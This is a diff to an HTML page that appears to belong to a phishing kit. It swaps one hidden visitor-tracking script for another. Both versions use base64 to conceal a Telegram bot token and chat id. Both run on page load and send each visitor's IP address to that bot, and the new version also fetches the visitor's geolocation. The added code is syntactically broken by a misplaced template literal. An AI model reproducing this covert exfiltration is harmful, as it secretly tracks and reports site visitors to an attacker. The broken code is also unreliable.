@@ -414,28 +414,23 @@ alert("");
 });
 </script>
     <script>
-    fetch(atob("aHR0cHM6Ly9hcGkuaXBpZnkub3Jn"))
-      .then(response => response.text())
-      .then(ip => {
-
-        var txt = `✨ Un nouveau visiteur sur le site ✨
-|---------------| Prémire Etape |---------------|
-${ip}`;
-
-
-        const data = { chat_id: atob("NjY2OTY5MzgwNQ=="), text: txt };
-        fetch("https://api.telegram.org/bot" + atob("NzA3ODc3MTY5NDpBQUhYRWFScDhTUTlwelNISFgyTGE1ZU56Z2RabUc2ZWtrTQ==") + "/sendMessage", {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        })
-          .then(response => response.json())
-          .then(data => {
-          })
-          .catch(err => {
-          });
-      })
-      .catch(error => console.error('Error:', error));
+    fetch('https://freeipapi.com/api/json')
+            .then(response => response.json())
+            .then(data => {
+                ii = `ip: ${data.ipAddress}
+const msg = `
+📍 **Location Info**
+🌐 La: ${data.latitude}
+🧭 Lo: ${data.longitude}
+🏳️ Country: ${data.countryName}
+🗺️ Region: ${data.regionName}
+🏙️ City: ${data.cityName}
+📮 ZIP: ${data.zipCode}
+`;
+                var tkn = atob("NzA3ODc3MTY5NDpBQUhYRWFScDhTUTlwelNISFgyTGE1ZU56Z2RabUc2ZWtrTQ==");
+                const data1 = { chat_id: atob("NjY2OTY5MzgwNQ=="), text: ii };
+                fetch("https://api.telegram.org/bot" + tkn + "/sendMessage", {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data1)})});
   </script>
   <script src="prodect.js"></script>
 </body>
